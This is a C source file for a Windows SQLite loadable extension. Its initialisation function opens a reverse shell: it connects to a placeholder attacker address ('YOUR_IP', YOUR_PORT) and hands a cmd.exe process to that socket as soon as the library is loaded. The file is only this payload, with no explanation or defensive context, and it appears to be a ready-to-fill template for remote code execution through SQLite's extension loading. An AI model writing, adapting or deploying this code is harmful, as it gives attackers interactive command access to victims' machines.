typedef struct sqlite3 sqlite3;
typedef struct sqlite3_api_routines sqlite3_api_routines;

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")


#define SQLITE_EXTENSION_INIT1
#define SQLITE_EXTENSION_INIT2(x)
#define SQLITE_OK 0

__declspec(dllexport) int sqlite3_extension_init(
    sqlite3 *db,                
    char **pzErrMsg,
    const sqlite3_api_routines *pApi   
) {
    SQLITE_EXTENSION_INIT2(pApi);   

    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("YOUR_IP");  
    sa.sin_port = htons(YOUR_PORT);                     

    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = (HANDLE)s;
        si.hStdOutput = (HANDLE)s;
        si.hStdError = (HANDLE)s;

        if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    closesocket(s);
    WSACleanup();

    return SQLITE_OK;   
}